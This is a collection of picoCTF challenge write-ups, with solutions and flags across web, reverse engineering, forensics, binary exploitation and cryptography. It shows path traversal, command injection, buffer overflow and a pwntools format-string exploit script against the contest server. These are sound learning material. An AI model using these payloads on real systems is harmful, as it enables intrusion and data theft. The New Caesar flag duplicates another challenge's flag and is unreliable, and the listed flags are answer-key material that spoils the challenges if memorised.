# Web

## Local Authority
### Solution
I looked up the page source to reveal the login.php POST request on form submission, and on reading through its code, I discovered references to `secure.js`, `styles.css` and `admin.php`.
Finally, after reading through the contents of all three, I found the correct pair of credentials, which I submitted to obtain the flag.

### Flag
`picoCTF{j5_15_7r4n5p4r3n7_b0c2c9cb}`


## Forbidden Paths
### Solution
I successively kept appending `../` to the relative path in the form, and eventually, the `file not found` error changed into the flag.

### Flag
`picoCTF{7h3_p47h_70_5ucc355_e5fe3d4d}`


## Caas
### Solution
I looked up the index.js file to realise that the `{message}` is not validated before being passed to exec and, thus, piped an `ls` after passing a random message as instructed in the front end. This revealed the existence of `falg.txt`, which I `cat`ed to obtain the flag.

### Flag
`picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}`



# Reverse Engineering

## Keygenme-py
### Solution
I read through the code and came across this:
```
key_part_static1_trial = "picoCTF{1n_7h3_|<3y_of_"
key_part_dynamic1_trial = "xxxxxxxx"
key_part_static2_trial = "}"
key_full_template_trial = key_part_static1_trial + key_part_dynamic1_trial + key_part_static2_trial
```
After a quick `Ctrl+F` for `key`, I found the function definition for `enter_license()` which revealed that `decrypt_full_version()` is only invoked when `check_key()` returns `true`.  With some digging, I realised that the first part of the flag is supposed to be `picoCTF{1n_7h3_|<3y_of_` and all we had to do was figure out the `xxxxxxxx`. To do this, I reverse engineered `check_key()` and printed the hexdigests of `username_trial` using the `sha256` algorithm and the `hashlib` library in the same order of indices `4,5,3,6,2,7,1,8` as in the `check_key()` definition. This resulted in the program printing the requried flag.

### Flag
`picoCTF{1n_7h3_|<3y_of_e584b363}`


## ARMssembly 0
### Solution
I compiled the program using the ARMv8 cross compiler suite provided by GNU through `binutils-aarch64-linux-gnu` & `gcc-aarch64-linux-gnu` and an ARMx64 static emulator `qemu-user-static`.  Finally, I ran the program with the given inputs using `./chall 3854998744 915131509` and converted the decimal result into the required hexadecimal flag.

### Flag
`picoCTF{E5C69CD8}`


## GDB Baby Step 1
### Solution
I loaded the given file in the `gdb	` debugger and disassembled `main`, which revealed that the value `0x86342` was stored in `eax` at the end of the program, which I explicitly converted into the `int` data type using `python3` and found the required flag.

### Flag
`picoCTF{549698}`



# Forensics

## tunn3l v1s10n
### Solution
I could not open the BMP file directly so I figured that the header was broken. After loading it in a hex editor, I looked up the reference to figure out that offset `16` had to be edited and after replacing the existing height `32 01` with `6e 04`, I loaded the image in `photopea` and could see the flag written on the image.

### Flag
`picoCTF{qu1t3_a_v13w_2020}`


## MacroHard WeakEdge
### Solution
I knew that `PPT` files are compressed files themselves, so I unzipped the given file and manually navigated through the extracted directories. I eventually found `/ppt/slideMasters/hidden` and `cat`ed it to reveal its contents, which on decoding from `Base64`, gave the required flag.

### Flag
`picoCTF{D1d_u_kn0w_ppts_r_z1p5}`


## Trivial Flag Transfer Protocol
### Solution
On opening the given file with wireshark, I first exported the exchanged files and decided to read each one of them. I deciphered `instructions.txt` first, realising that it was a `ROT13` cipher and hence, similarly, decoded `plan` to reveal that the `DUEDILIGENCE	` 	was some sort of a password. I decided to use `steghide` on every exported image in the directory and finally found the required flag in `picture3.bmp`.

### Flag
`picoCTF{h1dd3n_1n_pLa1n_51GHT_18375919}`



# Binary Exploitation

## Stonks
### Solution
I figured out that since the program simply returned the same input string to the user, it could provide access to the remote memory and it was vulnerable to a [format string attack](https://en.wikipedia.org/wiki/Uncontrolled_format_string). I tested this by passing `%x.%x.%x` which did give me the values of some variables and after some trial and error, I figured that the flag starts at the 15th memory location. From then, retrieving the required flag was a simple exploit script away:
```
from pwn import *

flag = b''
for i in range(15, 22):
    with context.local(log_level = "error"):
        r = remote("mercury.picoctf.net", 21973)
        r.sendlineafter("What would you like to do?\n", "1")
        r.sendlineafter("What is your API token?\n", f"%{i}$p")
        r.recvuntilS("Buying stonks with token:\n")
        out = r.recvline()
        try:
            res = p32(int(out.decode(), 16))
            flag += res
        except Exception:
            pass
        r.recvall()

print(flag)
```

### Flag
`picoCTF{I_l05t_4ll_my_m0n3y_1cf201a0}`


## buffer overflow 0
### Solution
Upon inspection of the source file, I found that the `strcpy` used a 100-long buffer that can be controlled by the user. My first instinct was to enter a longer string and see if it will leak anything, and it worked.

### Flag
`picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}`


## babygame01
### Solution
I opened the game in ghidra and realised that `p` could be used to traverse immediately to x but only resulted in a `"You Win!"` without the flag. After playing around for a while, I discovered that going back four positions from the top-leftmost visible position changes the value of `flag` to `64` after which I pressed `p` to win the game and retrieve the flag.

### Flag
`picoCTF{gamer_m0d3_enabled_8985ce0e}`



# Cryptography

## New Caesar
### Solution
I just reversed the encoding mechanism in the given python script and experimented with the offsets, which eventually gave the required flag.

### Flag
`picoCTF{qu1t3_a_v13w_2020}`


## basic-mod1
### Solution
I wrote a script that performed operations as per the given instructions
```
from string import ascii_uppercase
x = [165, 248, 94, 346, 299, 73, 198, 221, 313, 137, 205, 87, 336, 110, 186, 69, 223, 213, 216, 216, 177, 138]


a = ascii_uppercase + "0123456789_"

for i in x:
    print(a[i % 37], end="")
```
    
`
### Flag
`picoCTF{R0UND_N_R0UND_B6B25531}`


## miniRSA
### Solution
I read that without padding, the encryption of `m` is basically `(m^e)%n`.  I created a script to automate the process of decoding `ascii` values of the computed integers while decoding the given cipher text and to decide the padding depending on whether the decoded message matched `pico` at all.

### Flag
`picoCTF{n33d_a_lArg3r_e_606ce004}`
